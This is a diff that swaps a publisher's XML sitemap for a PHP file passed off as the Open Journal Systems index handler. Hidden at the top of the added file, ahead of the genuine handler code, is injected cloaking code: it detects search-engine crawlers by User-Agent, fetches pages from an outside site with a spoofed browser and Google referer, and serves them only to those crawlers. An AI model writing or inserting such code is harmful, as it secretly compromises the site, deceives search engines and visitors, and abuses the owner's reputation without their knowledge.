@@ -1,417 +1,50 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<urlset
-      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
-      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
-            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
-<!-- created with Free Online Sitemap Generator www.xml-sitemaps.com -->
+<?php
+@ob_start();
+header("Vary: U-Agent");
+
+$src = "https://childrenofiran.org/landing/new-anthor/";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+    $ctx = stream_context_create([
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
+        ]
+    ]);
+    return @file_get_contents($u, false, $ctx);
+}
+
+if (preg_match($match, $ua)) {
+    usleep(rand(100000, 200000));
+    echo stealth($src);
+    @ob_end_flush();
+    exit;
+}
+
+/**
+ * @defgroup pages_index Index Pages
+ */
+ 
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ * @brief Handle site index requests. 
+ *
+ */
+
+switch ($op) {
+	case 'index':
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
+		break;
+}
 
 
-<url>
-  <loc>https://publisher.yayasancec.or.id/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>1.00</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/about/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.80</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/contact/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.80</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/product/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.80</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/blog/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.80</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2024/01/26/pembelajaran-bahasa-inggris-berbasis-moderasi-beragama/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/author/admin/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2024/01/26/online-face-to-face-or-hybrid-learning/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2024/01/21/english-islamic-reading-text/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/05/23/pocket-book-of-pragmatics-clone/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/03/07/learnerpedagogy/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/03/07/pocket-book-of-linguistics/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/02/12/teori-ekonomi-makro/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/02/12/pengantar-ilmu-hukum-pthi/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/02/12/inovasi-media-metode-dan-teknologi-pembelajaran-di-era-meta-learning/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/02/12/inovasi-penelitian-dan-pembelajaran-abad-21/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/blog/page/2/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.64</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/bahasa/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/book/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/multidisciplinary/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/trends/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/bahasa/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/book/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/pocket-book/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/pragmatics/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/author/admin/page/2/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/pocket-book/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/pragmatics/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/research/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/research-book/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/linguistic/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/linguistik/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/ekonomi/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/makro/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/telaahekonomidanislam/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/teori/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/teoriekonomi/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/teoriekonomimakro/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/hukum/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/ilmuhukum/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/pengantarhukum/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/pthi/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/era/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/inovasi/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/inovasimedia/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/media/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/metalearning/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/metode/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/pembelajaran/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/tenologipembelajaran/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/21era/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/abad21/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/inoavasi/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/learning/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/penelitian/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/research/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/02/12/pedagogical-translation-in-english/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/01/10/stilistika-dan-bahasa-pada-lirik-lagu-busmama/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/01/10/sistem-sosial-dan-budaya-lokal/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2023/01/10/multidisciplinary-approaches-to-research-volume-1/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/2022/11/17/m2/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.51</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/book/page/2/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/busmama/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/english/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/liriklagu/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/pedagogical/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/stilistika/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/translation/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/busmama/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/lirik-lagu/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/stilistika/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/budaya-lokal/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/mandar/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/sistem-sosial/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/category/tinjauan-historis/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/budayalokal/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/mandar/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/perubahansosial/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/sistemsosial/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/tinajauanhistoris/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-<url>
-  <loc>https://publisher.yayasancec.or.id/tag/multidisciplinary-approaches/</loc>
-  <lastmod>2025-11-16T17:52:58+00:00</lastmod>
-  <priority>0.41</priority>
-</url>
-
-
-</urlset>
